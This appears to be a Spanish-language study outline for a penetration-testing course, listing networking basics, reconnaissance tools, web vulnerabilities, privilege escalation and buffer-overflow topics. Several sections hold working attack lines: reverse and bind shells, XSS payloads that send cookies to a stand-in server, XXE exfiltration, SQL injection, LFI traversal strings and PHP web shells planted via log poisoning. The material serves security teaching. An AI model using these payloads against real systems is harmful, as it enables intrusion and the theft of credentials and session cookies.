Introducción al Hacking
=======================

Introducción
============

### Bienvenido/a al curso
 - Certificaciones:
   - eJPTv2 (eLearnSecurity Junior Penetration Tester version 2)
   - eCPPTv2  (eLearnSecurity Certified Professional Penetration Tester version 2)
   - eWPT (eLearnSecurity Web application Penetration Tester)
   - OSWE (Offensive Security Web Expert)

### Explorando las funcionalidades de las clases


Conceptos básicos
=================

### Direcciones IP (IPV4 e IPV6)
 - Conceptos: IPv4, IPv6

### Direcciones MAC (OUI y NIC)
 - Conceptos: MAC (OUI:NIC)
 - Comandos: arp-scan, macchanger

### Protocolos comunes (UDP, TCP) y el famoso Three-Way Handshake
 - Conceptos: TCP, UDP, puertos, syn-synack-ack (RST)
 - Comandos: nc
 - Programas: wireshark

### El modelo OSI – ¿En qué consiste y cómo se estructura la actividad de red en capas?
 - OSI: Física (1), enlace (2), red (3), transporte (4), sesión (5), presentación (6), aplicación (7)

### Subnetting – ¿Qué es y cómo se interpreta una máscara de red?
 - Conceptos: Mascara de Red, Subnetting, CIDR

### Subnetting – CIDRs y cálculo total de hosts
 - Conceptos: Clase A,B,C

### Subnetting – Máscaras de subred, tipos de clase e interpretación de prefijos de red
 - Conceptos: Network ID, Broadcast Address

### Subnetting – Interpretación de los rangos de red que el cliente nos ofrece para auditar

### Subnetting - Redes extrañas y casos particulares

### Cuestionario de subnetting y redes

### TIPS de subnetting y cálculo veloz de direccionamiento en redes


Reconocimiento
==============

### Nmap y sus diferentes modos de escaneo
 - Conceptos: puertos abiertos, filtrados, cerrados
 - Comandos: nmap, tcpdump, iwconfig
 - nmap: -p -n -s -v -T -O -sn -Pn -sU -sV --top-ports --open

### Técnicas de evasión de Firewalls (MTU, Data Length, Source Port, Decoy, etc.)
 - Comandos: netstat, ss
 - nmap: -f -D -sS –mtu –data-length –source-port –spoof-mac –min-rate

### Uso de scripts y categorías en nmap para aplicar reconocimiento
 - Conceptos: fuzzing
 - Comandos: lsof, pwdx, tshark, xxd
 - nmap: -sC -sCV --script
 - scripts:
   - Extension: .nse
   - Parametros: default, discovery, safe, intrusive, vuln
   - Categories: auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, vuln

### Creación de tus propios scripts en Lua para nmap

### Alternativas para la enumeración de puertos usando descriptores de archivo
 - /dev/tcp/{ip}/{puerto}

### Descubrimiento de equipos en la red local (ARP e ICMP) y Tips
 - Comandos: arp-scan, netdiscover, masscan, ping, timeout
 - nmap: -sn

### Validación del objetivo (Fijando un target en HackerOne)
 - Recursos: hackerone, bugcrowd

### Descubrimiento de correos electrónicos
 - Recursos:
   - https://hunter.io/
   - https://intelx.io/
   - https://phonebook.cz/
   - https://www.verifyemailaddress.org/
   - https://email-checker.net/
 - Chrome extension: Clearbit Connect

### Reconocimiento de imágenes
 - Recursos:
   - https://pimeyes.com/es

### Enumeración de subdominios
 - Recursos:
   - Phonebook (Herramienta pasiva): https://phonebook.cz/
   - Intelx (Herramienta pasiva): https://intelx.io/
   - CTFR (Herramienta pasiva): https://github.com/UnaPibaGeek/ctfr
   - Gobuster (Herramienta activa): https://github.com/OJ/gobuster
   - Wfuzz (Herramienta activa): https://github.com/xmendez/wfuzz
   - Sublist3r (Herramienta pasiva): https://github.com/huntergregal/Sublist3r
   - SecLists (diccionarios): https://github.com/danielmiessler/SecLists

### Credenciales y brechas de seguridad
 - Recursos:
   - https://www.dehashed.com/

### Identificación de las tecnologías en una página web
 - Comandos: whatweb, wig
 - Recursos: https://builtwith.com/es/
 - Chrome extension: Wappalyzer

### Fuzzing y enumeración de archivos en un servidor web (1/2)
 - Comandos: gobuster, wfuzz, upx

### Fuzzing y enumeración de archivos en un servidor web (2/2)
 - Comandos: ffuf
 - Aplicaciones: burp suite
 - Chrome extension: foxy proxy

### Google Dorks / Google Hacking (Los 18 Dorks más usados)
 - Comandos: exiftool
 - Google Dork: site, filetype, intext
 - Recursos:
   - https://pentest-tools.com/information-gathering/google-hacking
   - https://www.exploit-db.com/

### Identificación y verificación externa de la versión del sistema operativo
 - Conceptos: ttl (64-linux, 128-windows)

### Cuestionario de reconocimiento


Configuración de laboratorios locales en Docker
===============================================

### Introducción a Docker
 - Comandos: docker

### Instalación de Docker en Linux

### Definiendo la estructura básica de Dockerfile

### Creación y construcción de imágenes

### Carga de instrucciones en Docker y desplegando nuestro primer contenedor

### Comandos comunes para la gestión de contenedores

### Port Forwarding en Docker y uso de monturas

### Despliegue de máquinas vulnerables con Docker-Compose (1/2)
 - Comandos: svn (para clonar una subcarpeta, ver /trunk)
 - Recursos: https://github.com/vulhub/vulhub

### Despliegue de máquinas vulnerables con Docker-Compose (2/2)
 - Comandos: pushd, popd

### Cuestionario de Docker


Enumeración de servicios comunes y gestores de contenido
========================================================

### Enumeración del servicio FTP
 - Comandos: ftp, hydra

### Enumeración del servicio SSH
 - Recursos: https://launchpad.net/ (para obtener la version de ubuntu en base a la version de ssh)

### Enumeración del servicio HTTP y HTTPS
 - Comandos: dirb, dirbuster, dirsearch, sslyze, sslscan
 - Conceptos: heartbleed

### Enumeración del servicio SMB
 - Comandos: smbclient, smbmap, mount, umount
 - Programas: crackmapexec
 - Conceptos: Samba, SMB

### Enumeración de gestores de contenido (CMS) – WordPress (1/2)
 - Comandos: searchsploit, wpscan
 - Recursos:
   - https://wpscan.com/
   - https://github.com/vavkamil/dvwp

### Enumeración de gestores de contenido (CMS) – WordPress (2/2)

### Enumeración de gestores de contenido (CMS) – Joomla
 - Recursos: https://github.com/OWASP/joomscan

### Enumeración de gestores de contenido (CMS) - Drupal
 - Recursos: https://github.com/SamJoan/droopescan

### Enumeración de gestores de contenido (CMS) – Magento
 - Recursos: https://github.com/SamJoan/droopescan

### Toma de apuntes con Obsidian
 - Recursos: https://obsidian.md/download


Conceptos básicos de enumeración y explotación
==============================================

### Introducción a la explotación de vulnerabilidades

### Reverse Shells, Bind Shells y Forward Shells
 - Recursos: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 - forward shell: mkfifo input; tail -f input | /bin/sh 2>&1 > output
 - bind shell: nc -nlvp 4646 -e /bin/bash
 - reverse shell: nc -e /bin/bash {ip} 443
 - bash -c "bash -i >& /dev/tcp/{ip}/443 0>&1"
 - nc -nlvp 443
 - script /dev/null -c bash (ctrl+z)
 - stty raw echo; fg
 - reset xterm
 - export TERM=xterm
 - SHELL=bash
 - stty rows 44 columns 184

### Tipos de payloads (Staged y Non-Staged)
 - Conceptos: payloads Staged, payloads Non-Staged
 - Comandos: msfvenom, msfdb, rlwrap

### Tipos de explotación (Manuales y Automatizadas)
 - Comandos: sqlmap
 - Recursos:
   - https://hashes.com/es/decrypt/hash
   - https://en.wikipedia.org/wiki/Rainbow_table


### Enumeración del sistema
 - Comandos: setcap, systemctl list-timers
 - Conceptos: root, nt authority system
 - Recursos:
   - https://github.com/diego-treitos/linux-smart-enumeration
   - https://github.com/rebootuser/LinEnum
   - https://github.com/DominicBreuker/pspy
   - https://gtfobins.github.io/
   - https://book.hacktricks.xyz/welcome/readme

### Introducción a BurpSuite


OWASP TOP 10 y vulnerabilidades web
===================================

### SQL Injection (SQLI)
 - 1'
 - 1' order by 100--
 - 1' union select 1,2--
 - 1' union select database()--
 - 1' union select group_concat(schema_name) from information_schema.schemata limit 0,1
 - 1' union select group_concat(table_name) from information_schema.tables where table_schema = '$base' limit 0,1
 - 1' union select group_concat(column_name) from information_schema.columns where table_schema = '$base' and table_name = '$tabla' limit 0,1
 - 1' union select group_concat(username,0x3a,password) from usuarios
 - 1' and sleep(5)

### Cross-Site Scripting (XSS) [1/2]
 - <script>alert("XSS")</script>
 - <script>window.location.href = "http://misitio"</script>
 - <script src="http://misitio/xss.js"></script>
 - <script>fetch(`http://tuservidor.com/?cookie=${encodeURIComponent(document.cookie)}`, { method: 'GET', mode: 'no-cors'});</script>
 - <img src="http://tuservidor.com/?cookie="+document.cookie style="display:none;" alt="imagen" width="1" height="1">

### Cross-Site Scripting (XSS) [2/2]

### XML External Entity Injection (XXE)
 - <!DOCTYPE foo [<!ENTITY xxe "miEntidad">]>
 - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "miEntidad">]>
 - <!DOCTYPE foo [<!ENTITY miArchivo SYSTEM "file:///etc/passwd">]>
 - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "miEntidad">]>
 - <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://misitio/xxe.dtd"> %xxe; ]>
 - <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://misitio/?file=%file;'">">
   %eval;
   %exfil;

### Local File Inclusion (LFI)
 - ?file=/etc/passwd
 - ?file=../../../../../../etc/passwd
 - ?file=....//....//....//....//....//....//etc/passwd
 - ?file=/etc//passwd
 - ?file=/etc/./passwd
 - ?file=/et?/?asswd
 - ?file=/etc/passwd%00
 - ?file=/etc/passwd/.
 - ?file=expect://whoami
 - ?file=php://filter/convert.base64-encode/resource=/etc/passwd
 - ?file=php://filter/read=string.rot13/resource=/etc/passwd
 - ?file=php://filter/convert.iconv.UTF8.UTF7/resource=/etc/passwd
 - ?file=php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
 - ?file=php://input (POST)
 - ?file=data://text/plain;base64,AAA==
 - php://memory
 - php://temp
 - https://github.com/synacktiv/php_filter_chain_generator

### Remote File Inclusion (RFI)

### Log Poisoning (LFI -> RCE)
 - curl -s -X GET "http://target" -H "User-Agent: <?php system(\$_GET['cmd']"); ?>
 - ?file=/var/log/apache2/access.log
 - ssh '<?php system($_GET["cmd"]"); ?>'@{ip}
 - cat /var/log/btmp ; echo

### Cross-Site Request Forgery (CSRF)

### Server-Side Request Forgery (SSRF)

### Server-Side Template Injection (SSTI)
 - {{7*7}}

### Client-Side Template Injection (CSTI)
 - {{7*7}}

### Ataque de oráculo de relleno (Padding Oracle)
 - Comandos: padbuster

### Ataque Type Juggling
 - POST: password[]=algo

### Inyecciones NoSQL
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
 - https://book.hacktricks.xyz/pentesting-web/nosql-injection

### Inyecciones LDAP
 - Comandos: ldapsearch, ldapadd
 - (&(cn=admin)(userPassword=*))
 - (&(cn=admin))%00

### Ataques de Deserialización

### Inyecciones LaTeX

### Abuso de APIs

### Abuso de subidas de archivos

### Prototype Pollution
 - "__proto__": {"isAdmin" : true}

### Ataques de transferencia de zona (AXFR - Full Zone Transfer)
 - Comandos: dig

### Ataques de asignación masiva (Mass-Asignment Attack) / Parameter Binding

### Open Redirect
 - Recursos: https://github.com/epsylon/ufonet

### Enumeración y explotación de WebDAV
 - Comandos: davtest, cadaver

### Enumeración y explotación de SQUID Proxies
 - curl http://server1 --proxy http://server1:3128

### Ataque ShellShock
 - curl -H "User-Agent: () { :; }; /usr/bin/id" http://[IP-del-servidor]/cgi-bin/[script-vulnerable]

### Inyecciones XPath
 - Recursos: https://book.hacktricks.xyz/pentesting-web/xpath-injection

### Insecure Direct Object Reference (IDORs)

### Intercambio de recursos de origen cruzado (CORS)

### Ataque de Truncado SQL (SQL Truncation)

### Session Puzzling / Session Fixation / Session Variable Overloading

### Enumeración y explotación de Json Web Tokens (JWT)
 - {"alg": "none"}

### Condiciones de carrera (Race Condition)

### Inyecciones CSS (CSSI)

### Python – Ataque de Deserialización Yaml (DES-Yaml)

### Python - Ataque de Deserialización Pickle (DES-Pickle)

### GraphQL Introspection, Mutations e IDORs

### Cuestionario de vulnerabilidades


Técnicas de escalada de privilegios
===================================

### Abusando de privilegios a nivel de Sudoers
 - awk 'BEGIN {system("/bin/sh")}'
 - Archivos: /etc/sudoers
 - Recursos: https://gtfobins.github.io/

### Abusando de privilegios SUID
 - chmod u+s /usr/bin/base64

### Detección y explotación de tareas Cron
 - pspy64
 - nc -nlvp 443 < pspy
 - cat < /dev/tcp/192.168.1.50/443 > pspy

### PATH Hijacking

### Python Library Hijacking

### Abuso de permisos incorrectamente implementados
 - /etc/passwd
 - /etc/shadow
 - Comandos: watch

### Detección y explotación de Capabilities
 - Comandos: capsh, pwdx

### Explotación del Kernel
 - searchsploit dirty cow /etc/passwd
 - https://github.com/The-Z-Labs/linux-exploit-suggester

### Abuso de grupos de usuario especiales
 - usermod -a -G docker usuario
 - docker run -dit -v /:/mnt/root ubuntu
 - usermod -a -G lxd usuario
 - docker run -dit -v /:/mnt/root ubuntu

### Abuso de servicios internos del sistema

### Abuso de binarios específicos
 - gdb, peda, EIP, ret2libc, ldd, readelf

### Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente
 - gcc -shared -fPIC test.c -o test
 - LDPRELOAD=./test  ./random
 - /etc/ld.so.conf.d/
 - https://github.com/namhyung/uftrace

### Docker Breakout
 - gpasswd -d usuario lxd
 - /var/run/docker.sock
 - shellcode

### Cuestionario de escalada de privilegios


Buffer overflow
===============

### Introducción al Buffer Overflow
 - EIP, ESI

### Creación de nuestro laboratorio de pruebas e instalación de Immunity Debuger

### Fase inicial de Fuzzing y tomando el control del registro EIP

### Asignación de espacio para el Shellcode

### Generación de Bytearrays y detección de Badchars

### Búsqueda de OpCodes para entrar al ESP y cargar nuestro Shellcode

### Uso de NOPs, desplazamientos en pila e interpretación del Shellcode para lograr RCE
 - msfvenom

### Modificación del Shellcode para controlar el comando que se desea ejecutar

### Explotando un nuevo binario para reforzar lo aprendido

### Funcionamiento y creación manual de Shellcodes

### Cuestionario de Buffer Overflow


Resolución de máquinas
======================

### Resolviendo nuestra primera máquina en conjunto
 - https://www.vulnhub.com/entry/imf-1,162/
 - https://github.com/NationalSecurityAgency/ghidra

### Resolviendo nuestra segunda máquina en conjunto
 - https://www.vulnhub.com/entry/casino-royale-1,287/

### Resolviendo nuestra tercera máquina en conjunto
 - https://www.vulnhub.com/entry/symfonos-61,458/

### Resolviendo nuestra cuarta máquina en conjunto
 - https://www.vulnhub.com/entry/presidential-1,500/

### Resolviendo nuestra quinta máquina en conjunto
 - https://www.vulnhub.com/entry/infovore-1,496/
 - https://github.com/carlospolop/PEASS-ng/


Material Adicional
==================

### Introducción a Metasploit

### Introducción a SQLMap

### Introducción al Pivoting
 - Comandos: shred, gopherus, proxychains, strace


Reportes y redacción de informes
================================

### Creando un reporte profesional en LaTeX (1/2)

### Creando un reporte profesional en LaTeX (2/2)

